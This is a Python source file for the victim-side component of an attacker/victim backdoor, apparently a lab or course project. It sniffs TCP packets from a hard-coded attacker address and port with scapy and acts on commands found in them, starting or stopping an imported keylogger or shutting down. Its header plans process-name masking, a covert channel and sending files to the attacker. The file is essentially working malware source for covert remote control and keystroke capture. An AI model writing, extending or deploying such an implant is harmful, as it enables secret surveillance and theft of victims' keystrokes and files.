#!/usr/bin/env python3

"""
- Create attacker/victim programs
- Mask process name
- Probably use covert channel

- Menu:
    - Start/stop keylogger
    - Transfer file from victim to attacker
    - Start/stop watching file for changes. If change, transfer to attacker
    - Start/stop watching directory. If change, transfer to attacker

"""


from scapy.all import *
from multiprocessing import Process
import sys
import keylog as keylogger


is_running = False
CURRENT_FUNC = ""


def exec_function(mode):
    global is_running

    # To start
    if is_running == False:
        if mode == "keylog":
            print("Activate: ", mode)
            is_running = True
            keylogger.start_keylogger()
        else:
            return
    # To stop
    elif is_running == True:
        if mode == "keylog":
            print("Stop: ", mode)
            is_running = False
            keylogger.stop_keylogger()
        else:
            return


def read_pkt(packet):
    global is_running

    data = packet[Raw].load.decode("utf-8")
    data_split = data.split("|")

    # Parse functionality from attacker
    func = data_split[0]

    if func == "quit":
        print("Shutdown signal received - exiting...")
        sys.exit()
    else:
        exec_function(func)


def main():
    print("Listening...\n")

    while True:
        sniff(filter="ip and tcp and host 192.168.1.75 and dst port 8505", count=1, prn=read_pkt)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
